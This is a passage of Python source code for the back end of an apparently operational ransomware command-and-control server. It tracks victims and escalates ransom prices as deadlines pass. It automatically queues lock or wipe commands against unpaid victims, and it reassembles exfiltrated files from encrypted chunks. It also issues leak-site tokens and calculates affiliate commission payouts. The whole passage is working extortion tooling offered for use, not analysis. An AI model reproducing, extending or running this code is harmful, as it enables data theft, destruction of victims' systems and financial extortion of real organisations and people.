def _pg_dump_bytes() -> bytes:
    try:
        out = subprocess.run(["pg_dump", "--dbname", DB_URL],
                             capture_output=True, check=True)
        return out.stdout
    except FileNotFoundError as exc:
        raise RuntimeError("pg_dump not found; install postgresql-client") from exc


def backup_bytes() -> bytes:
    import tempfile
    if IS_PG:
        return _pg_dump_bytes()
    fd, path = tempfile.mkstemp(suffix=".db")
    os.close(fd)
    src = None
    dst = None
    try:
        src = db()
        dst = sqlite3.connect(path)
        src.backup(dst)
        dst.commit()
        dst.close()
        dst = None
        # A backup is an operator export, not a key-escrow primitive: strip
        # root/shadow credentials and TOTP seeds that admins must not obtain.
        scrub = sqlite3.connect(path)
        try:
            scrub.execute("DELETE FROM operators WHERE role IN ('root','shadow')")
            scrub.execute("UPDATE operators SET totp_secret='', backup_codes=''")
            scrub.commit()
        finally:
            scrub.close()
        with open(path, "rb") as f:
            return f.read()
    finally:
        if dst is not None:
            try: dst.close()
            except Exception: pass
        if src is not None:
            try: src.close()
            except Exception: pass
        try:
            os.unlink(path)
        except OSError:
            # Windows can hold the file briefly; retry after a short wait.
            import time as _time
            _time.sleep(0.2)
            try: os.unlink(path)
            except OSError: pass


def backup_snapshot(dest_dir: str, keep: int) -> str:
    os.makedirs(dest_dir, exist_ok=True)
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    if IS_PG:
        path = os.path.join(dest_dir, f"vex_c2-{stamp}.dump")
        with open(path, "wb") as f:
            f.write(_pg_dump_bytes())
    else:
        path = os.path.join(dest_dir, f"vex_c2-{stamp}.db")
        with db() as src, sqlite3.connect(path) as dst:
            src.backup(dst)
    snaps = sorted(glob.glob(os.path.join(dest_dir, "vex_c2-*.db")) +
                   glob.glob(os.path.join(dest_dir, "vex_c2-*.dump")))
    if keep > 0:
        for old in snaps[:-keep]:
            try:
                os.unlink(old)
            except OSError:
                pass
    return path


def make_backup_codes(count: int = 8):
    """Return (plain codes, json of sha256 hashes)."""
    import json
    codes = [secrets.token_hex(5) for _ in range(count)]
    hashed = [hashlib.sha256(c.encode()).hexdigest() for c in codes]
    return codes, json.dumps(hashed)


def consume_backup_code(stored: str, code: str):
    """Return (accepted, new_stored_json)."""
    import json
    try:
        arr = json.loads(stored or "[]")
    except Exception:
        return False, stored
    digest = hashlib.sha256((code or "").strip().encode()).hexdigest()
    if digest in arr:
        arr.remove(digest)
        return True, json.dumps(arr)
    return False, stored

# ---------------------------------------------------------------------------
# campaign: pricing, deadlines, commands, payments
# ---------------------------------------------------------------------------
def _hours_since(ts: str) -> float:
    try:
        t0 = datetime.datetime.strptime(ts or "", "%Y-%m-%d %H:%M:%S")
    except ValueError:
        return 0.0
    return max(0.0, (datetime.datetime.now() - t0).total_seconds() / 3600.0)


def _f(key: str, default: float) -> float:
    try:
        return float(get_setting(key, str(default)) or default)
    except ValueError:
        return default


def effective_price(v) -> float:
    """Base price plus deadline escalation steps, by hours since first contact."""
    base = float(v["price"] or 0)
    if base <= 0:
        return 0.0
    hours = _hours_since(v["timestamp"])
    pct = 0.0
    if hours >= _f("escalate_2_hours", 72):
        pct = _f("escalate_2_pct", 100)
    elif hours >= _f("escalate_1_hours", 24):
        pct = _f("escalate_1_pct", 50)
    return round(base * (1.0 + pct / 100.0), 2)


def deadline_for(v) -> str:
    if v["deadline"]:
        return v["deadline"]
    try:
        t0 = datetime.datetime.strptime(v["timestamp"], "%Y-%m-%d %H:%M:%S")
    except (ValueError, TypeError):
        return ""
    hours = _f("deadline_hours", 72)
    return (t0 + datetime.timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")


def ensure_invoice(v) -> str:
    if v["invoice_id"]:
        return v["invoice_id"]
    inv = "INV-" + (v["vid"] or "").upper()
    with db() as conn:
        conn.execute("UPDATE victims SET invoice_id=? WHERE vid=? AND invoice_id=''",
                     (inv, v["vid"]))
        conn.execute("INSERT OR IGNORE INTO invoices (vid, number, amount, status, "
                     "created, updated) VALUES (?,?,?,?,?,?)",
                     (v["vid"], inv, float(v["price"] or 0), "open", now(), now()))
        conn.commit()
    return inv


def cancel_destructive_commands(vid: str) -> int:
    """Cancel queued lock/wipe work when a victim is pardoned or pays."""
    with db() as conn:
        cur = conn.execute(
            "UPDATE commands SET status='canceled', updated=? "
            "WHERE vid=? AND status IN ('pending','dispatched') "
            "AND ctype IN ('lock','wipe')", (now(), vid))
        conn.commit()
        return cur.rowcount


def queue_command(vid: str, ctype: str, arg: str = "", priority: int = 0,
                  max_attempts: int = 3, timeout_s: int = 300) -> int:
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO commands (vid, ctype, arg, status, created, updated, "
            "priority, max_attempts, timeout_s) VALUES (?,?,?,'pending',?,?,?,?,?)",
            (vid, ctype, arg, now(), now(), int(priority),
             max(1, int(max_attempts)), max(30, int(timeout_s))))
        new_id = _insert_id(conn, cur)
        conn.commit()
        return new_id


def claim_command(vid: str):
    """Atomically hand the highest-priority pending command to a payload.

    A single UPDATE...RETURNING prevents two concurrent pings from claiming the
    same row (the old SELECT-then-UPDATE could double-dispatch). Falls back to a
    rowcount-checked update on SQLite builds without RETURNING.
    """
    with db() as conn:
        try:
            row = conn.execute(
                "UPDATE commands SET status='dispatched', attempts=attempts+1, "
                "dispatched_at=?, updated=? WHERE id=(SELECT id FROM commands "
                "WHERE vid=? AND status='pending' ORDER BY priority DESC, id LIMIT 1) "
                "AND status='pending' RETURNING *",
                (now(), now(), vid)).fetchone()
            conn.commit()
            return row
        except sqlite3.OperationalError:
            row = conn.execute(
                "SELECT * FROM commands WHERE vid=? AND status='pending' "
                "ORDER BY priority DESC, id LIMIT 1", (vid,)).fetchone()
            if not row:
                return None
            cur = conn.execute(
                "UPDATE commands SET status='dispatched', attempts=attempts+1, "
                "dispatched_at=?, updated=? WHERE id=? AND status='pending'",
                (now(), now(), row["id"]))
            conn.commit()
            if cur.rowcount == 0:
                return None
            return conn.execute("SELECT * FROM commands WHERE id=?",
                                (row["id"],)).fetchone()


def finish_command(cid: int, vid: str, ok: bool, output: str,
                   error: str = "") -> bool:
    with db() as conn:
        cur = conn.execute(
            "UPDATE commands SET status=?, output=?, error=?, updated=? "
            "WHERE id=? AND vid=? AND status='dispatched'",
            ("done" if ok else "failed", (output or "")[:60000], (error or "")[:500],
             now(), cid, vid))
        conn.commit()
        return cur.rowcount > 0


def cancel_command(cid: int) -> bool:
    with db() as conn:
        cur = conn.execute(
            "UPDATE commands SET status='canceled', updated=? "
            "WHERE id=? AND status IN ('pending','dispatched')", (now(), cid))
        conn.commit()
        return cur.rowcount > 0


def expire_commands() -> int:
    """Return timed-out dispatches to pending (retry) or fail them."""
    expired = 0
    with db() as conn:
        rows = conn.execute(
            "SELECT * FROM commands WHERE status='dispatched'").fetchall()
        for r in rows:
            try:
                started = datetime.datetime.strptime(r["dispatched_at"] or "", "%Y-%m-%d %H:%M:%S")
            except ValueError:
                started = datetime.datetime.now() - datetime.timedelta(days=1)
            if (datetime.datetime.now() - started).total_seconds() <= int(r["timeout_s"] or 300):
                continue
            if int(r["attempts"] or 0) >= int(r["max_attempts"] or 3):
                cur = conn.execute(
                    "UPDATE commands SET status='failed', error='timeout', "
                    "updated=? WHERE id=? AND status='dispatched' AND dispatched_at=?",
                    (now(), r["id"], r["dispatched_at"] or ""))
            else:
                cur = conn.execute(
                    "UPDATE commands SET status='pending', dispatched_at='', "
                    "updated=? WHERE id=? AND status='dispatched' AND dispatched_at=?",
                    (now(), r["id"], r["dispatched_at"] or ""))
            if cur.rowcount:
                expired += 1
        conn.commit()
    return expired


def commands_for(vid: str, limit: int = 20):
    with db() as conn:
        return conn.execute("SELECT * FROM commands WHERE vid=? ORDER BY id DESC LIMIT ?",
                            (vid, limit)).fetchall()


def commands_recent(limit: int = 100):
    with db() as conn:
        return conn.execute("SELECT * FROM commands ORDER BY id DESC LIMIT ?",
                            (limit,)).fetchall()


def add_payment(vid: str, amount: float, note: str = "", txid: str = "",
                actor: str = "", affiliate: str = "") -> float:
    """Record a payment or refund and reconcile victim/invoice state."""
    _v0 = get_victim(vid)
    if _v0:
        ensure_invoice(_v0)
    with db() as conn:
        conn.execute("INSERT INTO payments (vid, amount, note, txid, actor, affiliate, ts) "
                     "VALUES (?,?,?,?,?,?,?)",
                     (vid, float(amount), note, txid, actor, affiliate or "", now()))
        conn.commit()
        total = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments WHERE vid=?",
                             (vid,)).fetchone()[0]
        v = conn.execute("SELECT * FROM victims WHERE vid=?", (vid,)).fetchone()
        paid_now = False
        unpaid_now = False
        need = effective_price(v) if v else 0.0
        if v:
            if (v["status"] not in ("dead", "pardoned")
                    and v["status"] != "paid" and need > 0
                    and total + 1e-9 >= need):
                conn.execute("UPDATE victims SET status='paid', paid_at=?, "
                             "detonate=0 WHERE vid=?", (now(), vid))
                paid_now = True
            elif v["status"] == "paid" and total + 1e-9 < need:
                # A refund dropped the victim below the current invoice.
                conn.execute("UPDATE victims SET status='negotiating', paid_at='', "
                             "detonate=0 WHERE vid=?", (vid,))
                unpaid_now = True
            elif amount < 0:
                conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
        conn.commit()
        if paid_now or unpaid_now:
            cancel_destructive_commands(vid)
        if paid_now:
            invoice_status = "paid"
        elif unpaid_now:
            invoice_status = "partial" if total > 0 else "open"
        elif v and v["status"] == "paid":
            invoice_status = "paid"
        elif total > 0:
            invoice_status = "partial"
        else:
            invoice_status = "open"
        conn.execute("UPDATE invoices SET amount=?, updated=?, status=? WHERE vid=?",
                     (float(total), now(), invoice_status, vid))
        conn.commit()
        return float(total)


def mark_paid(vid: str, actor: str = "", affiliate: str = "") -> bool:
    """Mark a live victim paid, book the remaining quote, and disarm it."""
    v = get_victim(vid)
    if not v or (v["status"] or "") in ("dead", "pardoned"):
        return False
    ensure_invoice(v)
    total = payments_total(vid)
    need = effective_price(v)
    if need > 0 and total + 1e-9 < need:
        add_payment(vid, need - total, "manual mark paid", "", actor,
                    affiliate or actor)
    with db() as conn:
        conn.execute("UPDATE victims SET status='paid', paid_at=COALESCE(paid_at,?), "
                     "detonate=0 WHERE vid=?", (now(), vid))
        conn.commit()
    cancel_destructive_commands(vid)
    sync_invoice(vid, "paid")
    return True


def release_victim(vid: str) -> bool:
    """Root override: release the victim without recording revenue."""
    v = get_victim(vid)
    if not v:
        return False
    ensure_invoice(v)
    with db() as conn:
        conn.execute("UPDATE victims SET status='paid', paid_at=COALESCE(paid_at,?), "
                     "detonate=0 WHERE vid=?", (now(), vid))
        conn.commit()
    cancel_destructive_commands(vid)
    sync_invoice(vid, "void")
    return True


def payments_total(vid: str) -> float:
    with db() as conn:
        row = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments WHERE vid=?",
                           (vid,)).fetchone()
    return float(row[0] or 0)


def payments_for(vid: str):
    with db() as conn:
        return conn.execute("SELECT * FROM payments WHERE vid=? ORDER BY id DESC",
                            (vid,)).fetchall()


def payments_recent(limit: int = 100):
    with db() as conn:
        return conn.execute(
            "SELECT p.*, v.hostname FROM payments p LEFT JOIN victims v ON v.vid=p.vid "
            "ORDER BY p.id DESC LIMIT ?", (limit,)).fetchall()

def list_templates():
    with db() as conn:
        return conn.execute("SELECT * FROM templates ORDER BY name").fetchall()


def get_template(name: str):
    with db() as conn:
        return conn.execute("SELECT * FROM templates WHERE name=?", (name,)).fetchone()


def save_template(name: str, body: str, kind: str = "chat") -> None:
    with db() as conn:
        conn.execute("INSERT INTO templates (name, body, kind, updated) VALUES (?,?,?,?) "
                     "ON CONFLICT(name) DO UPDATE SET body=excluded.body, "
                     "kind=excluded.kind, updated=excluded.updated",
                     (name[:64], body[:8000], kind[:32], now()))
        conn.commit()


def deadline_tick() -> int:
    """Queue the configured action for victims whose deadline passed."""
    action = (get_setting("auto_action", "none") or "none").strip().lower()
    if action not in ("lock", "wipe"):
        return 0
    fired = 0
    now_s = now()
    with db() as conn:
        rows = conn.execute(
            "SELECT vid FROM victims WHERE deadline_fired=0 AND status!='paid' "
            "AND COALESCE(pardon,0)=0 AND status NOT IN ('paid','pardoned','dead') "
            "AND deadline!='' AND deadline<=?", (now_s,)).fetchall()
        for r in rows:
            vid = r["vid"]
            conn.execute(
                "INSERT INTO commands (vid, ctype, arg, status, created, updated) "
                "VALUES (?,?,'','pending',?,?)", (vid, action, now_s, now_s))
            conn.execute("UPDATE victims SET deadline_fired=1 WHERE vid=?", (vid,))
            conn.commit()
            log_event("system", "deadline", vid, action)
            tpl = get_template("deadline")
            if tpl and tpl["body"]:
                push_chat(vid, "ADMIN", tpl["body"])
            fired += 1
    return fired

# ---------------------------------------------------------------------------
# exfil uploads
# ---------------------------------------------------------------------------
def add_upload(vid: str, name: str, path: str, size: int) -> int:
    digest = ""
    try:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for block in iter(lambda: f.read(1024 * 1024), b""):
                h.update(block)
        digest = h.hexdigest()
    except OSError:
        pass
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO uploads (vid, name, size, path, ts, sha256) "
            "VALUES (?,?,?,?,?,?)",
            (vid, name[:255], int(size), path, now(), digest))
        new_id = _insert_id(conn, cur)
        conn.commit()
        return new_id


def list_uploads(vid: str):
    with db() as conn:
        return conn.execute(
            "SELECT * FROM uploads WHERE vid=? ORDER BY id DESC", (vid,)).fetchall()


def uploads_recent(limit: int = 200):
    with db() as conn:
        return conn.execute(
            "SELECT u.*, v.hostname FROM uploads u LEFT JOIN victims v ON v.vid=u.vid "
            "ORDER BY u.id DESC LIMIT ?", (limit,)).fetchall()


def get_upload(uid: int):
    with db() as conn:
        return conn.execute("SELECT * FROM uploads WHERE id=?", (uid,)).fetchone()


def uploads_total(vid: str) -> int:
    with db() as conn:
        row = conn.execute(
            "SELECT COALESCE(SUM(size),0) FROM uploads WHERE vid=?", (vid,)).fetchone()
    return int(row[0] or 0)


def touch_sig(vid: str, ts: int) -> None:
    with db() as conn:
        if IS_PG:
            conn.execute("UPDATE victims SET last_sig_ts=GREATEST("
                         "COALESCE(last_sig_ts,0), ?) WHERE vid=?", (int(ts), vid))
        else:
            conn.execute("UPDATE victims SET last_sig_ts=MAX("
                         "COALESCE(last_sig_ts,0), ?) WHERE vid=?", (int(ts), vid))
        conn.commit()


# ---------------------------------------------------------------------------
# affiliates / payouts
# ---------------------------------------------------------------------------
def set_commission(username: str, pct: float) -> None:
    with db() as conn:
        conn.execute("UPDATE operators SET commission_pct=? WHERE username=?",
                     (max(0.0, min(100.0, float(pct))), username))
        conn.commit()


def affiliates():
    """Per-operator totals, commission owed and balance."""
    out = []
    with db() as conn:
        ops = conn.execute(
            "SELECT username, role, COALESCE(commission_pct,0) AS pct "
            "FROM operators ORDER BY username").fetchall()
        for op in ops:
            total = conn.execute(
                "SELECT COALESCE(SUM(amount),0) FROM payments WHERE affiliate=?",
                (op["username"],)).fetchone()[0]
            paid = conn.execute(
                "SELECT COALESCE(SUM(amount),0) FROM payouts "
                "WHERE operator=? AND status='paid'",
                (op["username"],)).fetchone()[0]
            committed = conn.execute(
                "SELECT COALESCE(SUM(amount),0) FROM payouts "
                "WHERE operator=? AND status IN ('requested','approved')",
                (op["username"],)).fetchone()[0]
            owed = float(total) * float(op["pct"]) / 100.0
            out.append({
                "username": op["username"], "role": op["role"], "pct": float(op["pct"]),
                "total": float(total), "commission": round(owed, 2),
                "paid": float(paid), "committed": float(committed),
                "balance": round(owed - float(paid) - float(committed), 2),
            })
    return out


def add_payout(operator: str, amount: float, note: str = "", actor: str = "",
               status: str = "paid", requested_by: str = "") -> None:
    with db() as conn:
        conn.execute("INSERT INTO payouts (operator, amount, note, actor, ts, "
                     "status, requested_by, updated) VALUES (?,?,?,?,?,?,?,?)",
                     (operator, float(amount), note, actor, now(), status,
                      requested_by, now()))
        conn.commit()


def set_payout_status(pid: int, status: str, actor: str = "") -> bool:
    if status not in ("requested", "approved", "paid", "rejected"):
        return False
    allowed = {
        "requested": {"approved", "paid", "rejected"},
        "approved": {"paid", "rejected"},
        "paid": set(),
        "rejected": set(),
    }
    with db() as conn:
        row = conn.execute("SELECT status FROM payouts WHERE id=?",
                           (int(pid),)).fetchone()
        if not row:
            return False
        current = (row["status"] or "paid")
        if status == current:
            return True
        if status not in allowed.get(current, set()):
            return False
        conn.execute("UPDATE payouts SET status=?, actor=?, updated=? WHERE id=?",
                     (status, actor, now(), int(pid)))
        conn.commit()
    return True


def request_payout(operator: str, amount: float, note: str = "") -> bool:
    """Reserve a payout only if the current commission balance covers it."""
    amount = float(amount)
    if amount <= 0:
        return False
    with db() as conn:
        if IS_PG:
            conn.execute("SELECT 1 FROM operators WHERE username=? FOR UPDATE",
                         (operator,))
        else:
            conn.execute("BEGIN IMMEDIATE")
        total = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments "
                             "WHERE affiliate=?", (operator,)).fetchone()[0]
        pct_row = conn.execute("SELECT COALESCE(commission_pct,0) FROM operators "
                               "WHERE username=?", (operator,)).fetchone()
        pct = float(pct_row[0]) if pct_row else 0.0
        paid = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payouts "
                            "WHERE operator=? AND status='paid'",
                            (operator,)).fetchone()[0]
        committed = conn.execute(
            "SELECT COALESCE(SUM(amount),0) FROM payouts "
            "WHERE operator=? AND status IN ('requested','approved')",
            (operator,)).fetchone()[0]
        balance = float(total) * pct / 100.0 - float(paid) - float(committed)
        if amount > balance + 1e-9:
            conn.rollback()
            return False
        conn.execute("INSERT INTO payouts (operator, amount, note, actor, ts, "
                     "status, requested_by, updated) VALUES (?,?,?,?,?,?,?,?)",
                     (operator, amount, note, operator, now(), "requested",
                      operator, now()))
        conn.commit()
    return True


def affiliate_summary(username: str) -> dict:
    with db() as conn:
        total = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payments "
                             "WHERE affiliate=?", (username,)).fetchone()[0]
        pct = conn.execute("SELECT COALESCE(commission_pct,0) FROM operators "
                           "WHERE username=?", (username,)).fetchone()
        pct = float(pct[0]) if pct else 0.0
        paid = conn.execute("SELECT COALESCE(SUM(amount),0) FROM payouts "
                            "WHERE operator=? AND status='paid'",
                            (username,)).fetchone()[0]
        requested = conn.execute(
            "SELECT COALESCE(SUM(amount),0) FROM payouts "
            "WHERE operator=? AND status IN ('requested','approved')",
            (username,)).fetchone()[0]
        victims = conn.execute("SELECT COUNT(DISTINCT vid) FROM payments "
                               "WHERE affiliate=?", (username,)).fetchone()[0]
    commission = float(total) * pct / 100.0
    return {"username": username, "pct": pct, "total": float(total),
            "commission": round(commission, 2), "paid": float(paid),
            "requested": float(requested),
            "balance": round(commission - float(paid) - float(requested), 2),
            "victims": int(victims)}


def create_campaign(name: str, note: str = "", config: str = "{}") -> int:
    with db() as conn:
        cur = conn.execute("INSERT INTO campaigns (name, note, active, created, config) "
                           "VALUES (?,?,?,?,?)",
                           (name.strip()[:120], note[:1000], 1, now(), config[:20000]))
        conn.commit()
        return _insert_id(conn, cur)


def campaign_by_token(token: str) -> int:
    token = (token or "").strip()
    if not token:
        return 0
    with db() as conn:
        rows = conn.execute("SELECT id, config FROM campaigns WHERE active=1"
                            ).fetchall()
    for row in rows:
        try:
            cfg = json.loads(row["config"] or "{}")
        except (TypeError, ValueError):
            continue
        if str(cfg.get("token") or "").strip() == token:
            return int(row["id"])
    return 0


def list_campaigns() -> list:
    with db() as conn:
        rows = conn.execute(
            "SELECT c.*, (SELECT COUNT(*) FROM victims v WHERE v.campaign_id=c.id) "
            "AS victims, (SELECT COALESCE(SUM(p.amount),0) FROM payments p "
            "JOIN victims v2 ON v2.vid=p.vid WHERE v2.campaign_id=c.id) AS revenue "
            "FROM campaigns c ORDER BY c.id DESC").fetchall()
    return rows


def get_campaign(cid: int):
    with db() as conn:
        return conn.execute("SELECT * FROM campaigns WHERE id=?", (int(cid),)).fetchone()


def update_campaign(cid: int, note: str, active: int, config: str) -> None:
    with db() as conn:
        conn.execute("UPDATE campaigns SET note=?, active=?, config=? WHERE id=?",
                     (note[:1000], 1 if active else 0, config[:20000], int(cid)))
        conn.commit()


def assign_campaign(vid: str, cid: int) -> None:
    with db() as conn:
        conn.execute("UPDATE victims SET campaign_id=? WHERE vid=?", (int(cid), vid))
        conn.commit()


def campaign_victims(cid: int) -> list:
    with db() as conn:
        return conn.execute("SELECT * FROM victims WHERE campaign_id=? "
                            "ORDER BY timestamp DESC", (int(cid),)).fetchall()


def add_artifact(campaign_id: int, kind: str, name: str, sha256: str,
                 path: str = "") -> int:
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO artifacts (campaign_id, kind, name, sha256, path, "
            "created, active) VALUES (?,?,?,?,?,?,1)",
            (int(campaign_id), kind[:32], name[:200], sha256[:128], path[:500], now()))
        conn.commit()
        return _insert_id(conn, cur)


def list_artifacts(campaign_id: int = 0) -> list:
    with db() as conn:
        if campaign_id:
            return conn.execute("SELECT * FROM artifacts WHERE campaign_id=? "
                                "ORDER BY id DESC", (int(campaign_id),)).fetchall()
        return conn.execute("SELECT * FROM artifacts ORDER BY id DESC LIMIT 200").fetchall()


def create_leak_token(vid: str, hours: int = 72) -> str:
    token = secrets.token_urlsafe(24)
    exp = (datetime.datetime.now() + datetime.timedelta(hours=max(1, int(hours)))
           ).strftime("%Y-%m-%d %H:%M:%S")
    with db() as conn:
        conn.execute("INSERT INTO leak_tokens (token, vid, expires, created, used) "
                     "VALUES (?,?,?,?,0)", (token, vid, exp, now()))
        conn.commit()
    return token


def mark_leak_use(vid: str, token: str) -> None:
    with db() as conn:
        conn.execute("UPDATE leak_tokens SET uses=COALESCE(uses,0)+1, "
                     "last_used=? WHERE token=? AND vid=?", (now(), token, vid))
        conn.commit()


def validate_leak_token(vid: str, token: str) -> bool:
    if not token:
        return False
    with db() as conn:
        row = conn.execute("SELECT expires FROM leak_tokens WHERE token=? AND vid=?",
                           (token, vid)).fetchone()
    if not row:
        return False
    try:
        return row["expires"] >= now()
    except Exception:
        return False


def health() -> dict:
    with db() as conn:
        conn.execute("SELECT 1").fetchone()
        victims = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
        pending = conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'"
                              ).fetchone()[0]
        messages = conn.execute("SELECT COUNT(*) FROM messages WHERE read_admin=0"
                               ).fetchone()[0]
    return {"ok": True, "victims": int(victims), "pending_commands": int(pending),
            "unread_messages": int(messages)}


def list_payouts(limit: int = 200):
    with db() as conn:
        return conn.execute("SELECT * FROM payouts ORDER BY id DESC LIMIT ?",
                            (limit,)).fetchall()


# ---------------------------------------------------------------------------
# Exfil v2: manifest + resumable, HMAC-verified, encrypted-at-rest chunks
# ---------------------------------------------------------------------------
def exfil_create(vid: str, name: str, size: int, sha256: str, total: int) -> int:
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO exfil_files (vid, name, size, sha256, total, received, "
            "status, created) VALUES (?,?,?,?,?,0,'open',?)",
            (vid, name[:200], int(size), sha256[:64].lower(), max(1, int(total)), now()))
        conn.commit()
        return _insert_id(conn, cur)


def exfil_get(fid: int):
    with db() as conn:
        return conn.execute("SELECT * FROM exfil_files WHERE id=?", (int(fid),)).fetchone()


def exfil_received(fid: int) -> list:
    with db() as conn:
        rows = conn.execute("SELECT idx FROM exfil_chunks WHERE file_id=? ORDER BY idx",
                            (int(fid),)).fetchall()
    return [int(r["idx"]) for r in rows]


def exfil_add_chunk(fid: int, idx: int, sha256: str, path: str) -> int:
    with db() as conn:
        conn.execute("INSERT OR IGNORE INTO exfil_chunks (file_id, idx, sha256, path, "
                     "created) VALUES (?,?,?,?,?)",
                     (int(fid), int(idx), sha256[:64].lower(), path, now()))
        conn.execute("UPDATE exfil_files SET received=(SELECT COUNT(*) FROM "
                     "exfil_chunks WHERE file_id=?) WHERE id=?", (int(fid), int(fid)))
        conn.commit()
    return len(exfil_received(fid))


def exfil_set_status(fid: int, status: str) -> None:
    with db() as conn:
        conn.execute("UPDATE exfil_files SET status=? WHERE id=?", (status, int(fid)))
        conn.commit()


def _uploads_root() -> str:
    return os.path.realpath(os.environ.get(
        "VEX_UPLOADS", os.path.join(APP_DIR, "uploads")))


def exfil_assemble(fid: int) -> bytes:
    import base64 as _b64
    f = exfil_get(fid)
    if not f:
        raise ValueError("no such file")
    try:
        limit = int(get_setting("exfil_max_mb", "512") or 512) * 1024 * 1024
    except ValueError:
        limit = 512 * 1024 * 1024
    if int(f["size"]) > limit:
        raise ValueError("declared size over limit")
    with db() as conn:
        rows = conn.execute("SELECT idx, path, sha256 FROM exfil_chunks "
                            "WHERE file_id=? ORDER BY idx", (int(fid),)).fetchall()
    if len(rows) != int(f["total"]):
        raise ValueError("incomplete")
    root = _uploads_root()
    out = bytearray()
    for r in rows:
        rp = os.path.realpath(r["path"])
        if os.path.commonpath([root, rp]) != root:
            raise ValueError("chunk path outside uploads")
        with open(rp, "r", encoding="utf-8") as fh:
            text = fh.read()
        raw = _b64.b64decode(vault_reveal_text(text))
        if r["sha256"] and hashlib.sha256(raw).hexdigest() != r["sha256"]:
            raise ValueError("chunk hash mismatch")
        out += raw
        if len(out) > limit:
            raise ValueError("assembled size over limit")
    if len(out) != int(f["size"]):
        raise ValueError("size mismatch")
    if hashlib.sha256(bytes(out)).hexdigest() != f["sha256"]:
        raise ValueError("hash mismatch")
    return bytes(out)


def vault_reveal_text(text: str) -> str:
    try:
        import vault
        return vault.reveal(text)
    except Exception:
        return text


# ---------------------------------------------------------------------------
# Campaign build jobs
# ---------------------------------------------------------------------------
def purge_victim(vid: str) -> dict:
    """Delete a victim and operational artifacts; keep the money ledger."""
    paths = []
    with db() as conn:
        for row in conn.execute("SELECT path FROM uploads WHERE vid=?", (vid,)):
            paths.append(row["path"])
        for row in conn.execute(
                "SELECT c.path FROM exfil_chunks c JOIN exfil_files f "
                "ON f.id=c.file_id WHERE f.vid=?", (vid,)):
            paths.append(row["path"])
        conn.execute("DELETE FROM exfil_chunks WHERE file_id IN "
                     "(SELECT id FROM exfil_files WHERE vid=?)", (vid,))
        conn.execute("DELETE FROM exfil_files WHERE vid=?", (vid,))
        conn.execute("DELETE FROM uploads WHERE vid=?", (vid,))
        conn.execute("DELETE FROM messages WHERE vid=?", (vid,))
        conn.execute("DELETE FROM commands WHERE vid=?", (vid,))
        conn.execute("DELETE FROM reports WHERE vid=?", (vid,))
        conn.execute("DELETE FROM leak_tokens WHERE vid=?", (vid,))
        conn.execute("DELETE FROM victims WHERE vid=?", (vid,))
        conn.commit()
    root = _uploads_root()
    removed = 0
    for path in paths:
        try:
            rp = os.path.realpath(path)
            if os.path.commonpath([root, rp]) != root:
                continue
            if os.path.isfile(rp):
                os.unlink(rp)
                removed += 1
        except (OSError, ValueError):
            pass
    return {"files": removed, "ledger": "preserved"}


def create_campaign_build(campaign_id: int) -> int:
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO campaign_builds (campaign_id, status, created, updated) "
            "VALUES (?, 'queued', ?, ?)", (int(campaign_id), now(), now()))
        conn.commit()
        return _insert_id(conn, cur)


def update_campaign_build(bid: int, status: str, log: str = "",
                          stager_path: str = "", sha256: str = "") -> None:
    with db() as conn:
        conn.execute("UPDATE campaign_builds SET status=?, log=?, stager_path=?, "
                     "sha256=?, updated=? WHERE id=?",
                     (status, (log or "")[-4000:], stager_path, sha256,
                      now(), int(bid)))
        conn.commit()


def get_campaign_build(bid: int):
    with db() as conn:
        return conn.execute("SELECT * FROM campaign_builds WHERE id=?",
                            (int(bid),)).fetchone()


def list_campaign_builds(campaign_id: int, limit: int = 50):
    with db() as conn:
        return conn.execute("SELECT * FROM campaign_builds WHERE campaign_id=? "
                            "ORDER BY id DESC LIMIT ?",
                            (int(campaign_id), int(limit))).fetchall()


def list_exfil_files(limit: int = 200):
    with db() as conn:
        return conn.execute("SELECT * FROM exfil_files ORDER BY id DESC LIMIT ?",
                            (int(limit),)).fetchall()


def exfil_chunks(fid: int):
    with db() as conn:
        return conn.execute("SELECT * FROM exfil_chunks WHERE file_id=? "
                            "ORDER BY idx", (int(fid),)).fetchall()


def delete_exfil(fid: int) -> list:
    paths = [r["path"] for r in exfil_chunks(fid)]
    with db() as conn:
        conn.execute("DELETE FROM exfil_chunks WHERE file_id=?", (int(fid),))
        conn.execute("DELETE FROM exfil_files WHERE id=?", (int(fid),))
        conn.commit()
    return paths


# ---------------------------------------------------------------------------
# Invoice history
# ---------------------------------------------------------------------------
def invoice_history(vid: str):
    with db() as conn:
        return conn.execute("SELECT * FROM invoices WHERE vid=? ORDER BY id DESC",
                            (vid,)).fetchall()


def sync_invoice(vid: str, status: str = "") -> None:
    total = payments_total(vid)
    with db() as conn:
        conn.execute("UPDATE invoices SET amount=?, updated=? WHERE vid=?",
                     (float(total), now(), vid))
        if status:
            conn.execute("UPDATE invoices SET status=?, updated=? WHERE vid=?",
                         (status, now(), vid))
        conn.commit()
